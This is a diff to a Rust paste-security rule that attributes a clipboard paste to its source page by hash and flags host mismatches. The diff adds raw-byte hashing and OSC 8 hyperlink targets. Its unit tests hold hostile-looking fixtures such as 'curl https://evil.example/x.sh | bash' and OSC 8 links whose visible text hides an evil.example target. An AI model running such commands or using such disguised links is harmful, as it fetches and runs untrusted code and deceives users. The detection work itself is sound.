@@ -64,15 +64,29 @@ use crate::verdict::{Evidence, Finding, RuleId, Severity};
 /// `shell` is the caller's shell so the destination-host extraction sees the
 /// same tokenization the rest of the pipeline used.
 ///
+/// `raw` is the ORIGINAL clipboard bytes (the engine passes
+/// `ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes())`). The
+/// content-hash comparison runs over THESE bytes, not the lossy `input` &str, so
+/// a non-UTF-8 paste hashes to the same value the browser extension computed over
+/// the original clipboard bytes — otherwise the attribution would silently fail
+/// to match. `input` is still used for the URL / OSC 8 extraction (which needs a
+/// `&str`).
+///
 /// Called LAST in the paste tier-3 branch (see `engine.rs`). Returns at most one
 /// finding; an empty vec when there is no recorded source, the content hash does
 /// not match, or there is no host mismatch.
-pub fn check(input: &str, shell: ShellType, prior: &[Finding], policy: &Policy) -> Vec<Finding> {
+pub fn check(
+    input: &str,
+    raw: &[u8],
+    shell: ShellType,
+    prior: &[Finding],
+    policy: &Policy,
+) -> Vec<Finding> {
     let record = match crate::clipboard::read_source_record() {
         Some(r) => r,
         None => return Vec::new(),
     };
-    check_with_record(input, shell, prior, policy, &record)
+    check_with_record(input, raw, shell, prior, policy, &record)
 }
 
 /// Test seam: evaluate against an explicitly-supplied [`ClipboardSourceRecord`]
@@ -82,8 +96,13 @@ pub fn check(input: &str, shell: ShellType, prior: &[Finding], policy: &Policy) 
 /// that supplies the record from disk. `shell` is threaded into the
 /// destination-host extraction so a PowerShell paste tokenizes as PowerShell,
 /// not POSIX.
+///
+/// `raw` is the ORIGINAL clipboard bytes; the content-hash comparison runs over
+/// THEM (not the lossy `input` &str) so a non-UTF-8 paste hashes to the same
+/// value the browser extension computed. See [`check`] for the lockstep note.
 pub fn check_with_record(
     input: &str,
+    raw: &[u8],
     shell: ShellType,
     prior: &[Finding],
     policy: &Policy,
@@ -93,8 +112,10 @@ pub fn check_with_record(
     // recorded source's hash, this paste did NOT come from that source: make no
     // attribution, emit nothing. A stale record (the clipboard was replaced
     // after the extension wrote it) must never falsely attribute an unrelated
-    // paste, so this guard is load-bearing.
-    if !content_matches(input, &record.content_sha256) {
+    // paste, so this guard is load-bearing. Hash the ORIGINAL `raw` bytes (what
+    // the extension hashed), NOT the lossy `input` &str — for a non-UTF-8 paste
+    // the lossy conversion would diverge and the match would be missed.
+    if !content_matches(raw, &record.content_sha256) {
         return Vec::new();
     }
 
@@ -105,8 +126,12 @@ pub fn check_with_record(
         return Vec::new();
     };
 
-    // Destination hosts from URLs in the pasted command. A paste with no URL has
-    // no destination to compare — no mismatch, no finding.
+    // Destination hosts from URLs in the pasted command, PLUS any OSC 8 hyperlink
+    // targets (their `href` host is an outbound destination even when the paste
+    // carries no plain URL — a paste whose ONLY link is an OSC 8 hyperlink to a
+    // different host is exactly the escalation signal we must catch). A paste
+    // with no destination at all has nothing to compare — no mismatch, no
+    // finding.
     let dest_hosts = destination_hosts(input, shell);
     if dest_hosts.is_empty() {
         return Vec::new();
@@ -134,10 +159,13 @@ pub fn check_with_record(
     vec![build_finding(&source_host, &mismatched, &signals, severity)]
 }
 
-/// `true` when `sha256(input)` (lowercase hex) equals `expected` (compared
+/// `true` when `sha256(raw)` (lowercase hex) equals `expected` (compared
 /// case-insensitively so a record written with uppercase hex still matches).
-fn content_matches(input: &str, expected: &str) -> bool {
-    let digest = Sha256::digest(input.as_bytes());
+/// Hashes the ORIGINAL clipboard `raw` bytes — NOT a lossy-decoded &str — so the
+/// digest matches what the browser extension computed over the same bytes even
+/// when the paste is not valid UTF-8.
+fn content_matches(raw: &[u8], expected: &str) -> bool {
+    let digest = Sha256::digest(raw);
     let mut actual = String::with_capacity(digest.len() * 2);
     for b in digest {
         use std::fmt::Write as _;
@@ -176,14 +204,34 @@ fn url_host(s: &str) -> Option<String> {
 /// hostname rules see. Threads the caller's `shell` so a PowerShell paste
 /// tokenizes as PowerShell (e.g. `;`-separated statements, backtick escapes),
 /// not POSIX — otherwise a mismatch in a non-POSIX paste could be missed.
+///
+/// Also folds in any OSC 8 hyperlink TARGET (`href`) host. The `href` of an
+/// embedded hyperlink is an outbound destination even when it appears in no
+/// plain-text URL token, so a paste whose ONLY outbound URL is an OSC 8 link
+/// must still produce a destination to compare against the source — otherwise
+/// the documented "OSC 8 visible≠target" escalation could never fire (the rule
+/// would early-return on an empty destination set first). Uses the SAME
+/// shipping output-byte scanner the visible≠target signal uses, so the OSC 8
+/// parsing is shared, not re-implemented.
 fn destination_hosts(input: &str, shell: ShellType) -> Vec<String> {
     let mut hosts: Vec<String> = Vec::new();
+    let mut push = |h: String| {
+        if !hosts.contains(&h) {
+            hosts.push(h);
+        }
+    };
     for url in crate::extract::extract_urls(input, shell) {
         if let Some(h) = url.parsed.host() {
-            let h = h.to_ascii_lowercase();
-            if !hosts.contains(&h) {
-                hosts.push(h);
-            }
+            push(h.to_ascii_lowercase());
+        }
+    }
+    // OSC 8 hyperlink targets.
+    let mut state = crate::extract::OutputScanState::default();
+    let mut result = crate::extract::OutputScanResult::default();
+    crate::extract::scan_output_chunk(input.as_bytes(), &mut state, &mut result);
+    for link in &result.hyperlinks {
+        if let Some(h) = url_host(&link.uri) {
+            push(h);
         }
     }
     hosts
@@ -378,6 +426,25 @@ mod tests {
         }
     }
 
+    /// Build a record whose `content_sha256` matches the given RAW bytes (which
+    /// may be invalid UTF-8). Mirrors what the browser extension does: it hashes
+    /// the original clipboard bytes, not a lossy &str.
+    fn record_for_bytes(raw: &[u8], source_url: &str) -> ClipboardSourceRecord {
+        let digest = Sha256::digest(raw);
+        let mut hex = String::new();
+        for b in digest {
+            use std::fmt::Write as _;
+            let _ = write!(hex, "{b:02x}");
+        }
+        ClipboardSourceRecord {
+            updated_at: "2026-05-30T00:00:00Z".to_string(),
+            content_sha256: hex,
+            source_url: source_url.to_string(),
+            source_title: "Test Page".to_string(),
+            hidden_text_detected: false,
+        }
+    }
+
     fn empty_policy() -> Policy {
         Policy::default()
     }
@@ -414,10 +481,71 @@ mod tests {
             "https://docs.trusted.example",
             false,
         );
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert!(
             findings.is_empty(),
             "a paste whose hash does not match the source must not be attributed"
+        );
+    }
+
+    // (b-bis) Round-3 regression (#1b): a NON-UTF-8 paste must be attributed by
+    // hashing the ORIGINAL raw bytes, not the lossy `from_utf8_lossy` &str. The
+    // browser extension hashes the raw clipboard bytes; if the rule hashed the
+    // lossy decode instead, the digest would diverge (the invalid byte becomes a
+    // 3-byte U+FFFD) and a real attribution would be silently missed. Here the
+    // raw bytes carry a `curl https://evil.example/...` line plus a lone invalid
+    // byte (0xFF); the record's hash is over those raw bytes, the source is on a
+    // different host, so the mismatch fires at Info.
+    #[test]
+    fn non_utf8_paste_hashes_raw_bytes_not_lossy() {
+        // Valid ASCII command + one invalid UTF-8 byte (0xFF) in a trailing token.
+        let mut raw = b"curl https://evil.example/x.sh -o x #".to_vec();
+        raw.push(0xFF);
+        let lossy = String::from_utf8_lossy(&raw).into_owned();
+
+        // Sanity: the raw bytes really are NOT valid UTF-8, so the lossy &str's
+        // bytes differ from the raw bytes — hashing the wrong one would diverge.
+        assert!(std::str::from_utf8(&raw).is_err());
+        assert_ne!(
+            lossy.as_bytes(),
+            raw.as_slice(),
+            "test premise: lossy decode must differ from the raw bytes"
+        );
+
+        // The record's hash is over the RAW bytes (what the extension computed).
+        let rec = record_for_bytes(&raw, "https://docs.trusted.example/install");
+
+        // The engine passes the lossy &str as `input` but the raw bytes as `raw`.
+        let findings =
+            check_with_record(&lossy, &raw, ShellType::Posix, &[], &empty_policy(), &rec);
+        assert_eq!(
+            findings.len(),
+            1,
+            "a non-UTF-8 paste must be attributed by its raw-byte hash; got {findings:?}"
+        );
+        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
+
+        // Guard the lockstep from the other side: had we hashed the lossy &str
+        // (the old bug), it would NOT match the record — so passing the lossy
+        // bytes as `raw` yields nothing. This is exactly the divergence #1b/#3 fix.
+        let nothing = check_with_record(
+            &lossy,
+            lossy.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
+        assert!(
+            nothing.is_empty(),
+            "hashing the lossy &str must NOT match the raw-byte record (proves the fix)"
         );
     }
 
@@ -426,7 +554,14 @@ mod tests {
     fn matched_same_host_emits_nothing() {
         let content = "curl https://docs.trusted.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/page", false);
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert!(
             findings.is_empty(),
             "no host mismatch (same host) must not fire; got {findings:?}"
@@ -439,7 +574,14 @@ mod tests {
         // A docs page that links an install URL on github.com, no other signal.
         let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(
             findings.len(),
             1,
@@ -460,7 +602,14 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         // The paste branch already assembled a PipeToInterpreter finding.
         let prior = [prior_finding(RuleId::PipeToInterpreter)];
-        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &prior,
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -480,7 +629,14 @@ mod tests {
         let content = "curl https://evil.example/x.sh | bash";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::CurlPipeShell)];
-        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &prior,
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -493,7 +649,14 @@ mod tests {
     fn matched_mismatch_with_hidden_text_flag_is_high() {
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", true);
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(findings[0].severity, Severity::High);
         assert!(findings[0].description.contains("hidden text"));
     }
@@ -504,7 +667,14 @@ mod tests {
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::ClipboardHidden)];
-        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &prior,
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(findings[0].severity, Severity::High);
     }
 
@@ -513,7 +683,14 @@ mod tests {
     fn matched_mismatch_with_shortener_is_high() {
         let content = "curl https://bit.ly/abc123 -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -529,7 +706,14 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
         policy.allowed_install_domains = vec!["github.com".to_string()];
-        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &policy,
+            &rec,
+        );
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -546,7 +730,14 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
         policy.allowed_install_domains = vec!["github.com".to_string()];
-        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &policy,
+            &rec,
+        );
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -573,9 +764,15 @@ mod tests {
         // A paste with no URL has no destination host to compare.
         let content = "echo hello world";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        assert!(
-            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
-        );
+        assert!(check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec
+        )
+        .is_empty());
     }
 
     #[test]
@@ -583,9 +780,15 @@ mod tests {
         let content = "curl https://github.com/x -o x";
         // A source URL with no resolvable host can't be compared.
         let rec = record_for(content, "about:blank", false);
-        assert!(
-            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
-        );
+        assert!(check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec
+        )
+        .is_empty());
     }
 
     #[test]
@@ -593,7 +796,15 @@ mod tests {
         let content = "curl https://www.docs.trusted.example/install.sh -o x";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         assert!(
-            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty(),
+            check_with_record(
+                content,
+                content.as_bytes(),
+                ShellType::Posix,
+                &[],
+                &empty_policy(),
+                &rec
+            )
+            .is_empty(),
             "www. on the destination must be treated as the same host as the source"
         );
     }
@@ -601,12 +812,21 @@ mod tests {
     #[test]
     fn osc8_visible_url_mismatch_is_a_signal() {
         // OSC 8: visible text `github.com` but the link target is evil.example.
-        // We embed a same-host plain URL too so there IS a destination host to
-        // compare, and assert the OSC8 mismatch pushes it to High.
-        let content =
-            "see \x1b]8;;https://evil.example/x\x1b\\github.com\x1b]8;;\x1b\\ then curl https://other.example/i.sh -o i";
+        // No plain URL is needed: the OSC 8 hyperlink target (`evil.example`) is
+        // itself a destination host, so the mismatch-against-source fires AND the
+        // OSC 8 visible≠target signal escalates it to High — proving a paste whose
+        // ONLY outbound URL lives in an OSC 8 hyperlink is no longer silently
+        // dropped by the empty-destination early return (the round-3 fix).
+        let content = "see \x1b]8;;https://evil.example/x\x1b\\github.com\x1b]8;;\x1b\\";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -614,6 +834,41 @@ mod tests {
             "an OSC 8 visible-vs-target host mismatch escalates to High"
         );
         assert!(findings[0].description.contains("OSC 8"));
+    }
+
+    // Round-3 regression (#1a): a paste whose ONLY outbound URL is an OSC 8
+    // hyperlink TARGET — with NO plain-text URL and NO visible-URL mismatch — must
+    // still produce a destination host and fire `PasteSourceMismatch`. Before the
+    // fix, `destination_hosts` saw only plain/scheme-less URL tokens, found none,
+    // and early-returned an empty vec, so the rule emitted nothing. The visible
+    // label here is "click here" (NOT a URL), so the OSC 8 visible≠target signal
+    // does NOT fire — this is a BARE mismatch (Info), isolating the
+    // "OSC 8 href feeds the destination set" behavior from the escalation signal.
+    #[test]
+    fn osc8_only_destination_fires_bare_mismatch() {
+        // Visible "click here" (not a URL), link target on evil.example. No plain
+        // URL anywhere in the paste.
+        let content = "run \x1b]8;;https://evil.example/install.sh\x1b\\click here\x1b]8;;\x1b\\";
+        let rec = record_for(content, "https://docs.trusted.example/install", false);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::Posix,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
+        assert_eq!(
+            findings.len(),
+            1,
+            "an OSC 8-only destination must still fire one finding; got {findings:?}"
+        );
+        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
+        assert_eq!(
+            findings[0].severity,
+            Severity::Info,
+            "a bare OSC 8 host mismatch (friendly visible label) is advisory Info"
+        );
     }
 
     // A non-POSIX (PowerShell) paste must still detect a host mismatch. The
@@ -632,6 +887,7 @@ mod tests {
         let prior = [prior_finding(RuleId::PsInlineDownloadExecute)];
         let findings = check_with_record(
             content,
+            content.as_bytes(),
             ShellType::PowerShell,
             &prior,
             &empty_policy(),
@@ -659,8 +915,14 @@ mod tests {
         let content =
             "iwr https://github.com/org/repo/releases/download/v1/tool.exe -OutFile tool.exe";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings =
-            check_with_record(content, ShellType::PowerShell, &[], &empty_policy(), &rec);
+        let findings = check_with_record(
+            content,
+            content.as_bytes(),
+            ShellType::PowerShell,
+            &[],
+            &empty_policy(),
+            &rec,
+        );
         assert_eq!(findings.len(), 1, "got {findings:?}");
         assert_eq!(findings[0].severity, Severity::Info);
     }
